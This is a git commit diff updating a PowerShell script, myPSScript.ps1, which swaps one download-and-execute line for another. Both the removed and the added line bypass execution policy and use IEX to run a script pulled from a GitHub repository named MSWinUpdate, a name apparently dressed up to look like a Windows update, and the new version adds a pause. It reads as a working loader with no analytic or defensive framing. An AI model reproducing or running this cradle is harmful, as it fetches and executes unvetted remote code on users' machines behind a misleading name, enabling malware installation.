fc11e4c1832746fd651ddc102fe4f8c7e9508fb4
network2city <107504914+network2city@users.noreply.github.com>
2023-04-11 08:57:51 -0400

    Update myPSScript.ps1

--- myPSScript.ps1
+++ myPSScript.ps1
@@ -1,1 +1,3 @@
-Start-Process -NoNewWindow powershell "-nop -ep bypass IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/network2city/MSWinUpdate/main/start.ps1')
+powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/network2city/MSWinUpdate/main/start.ps1')
+
+pause
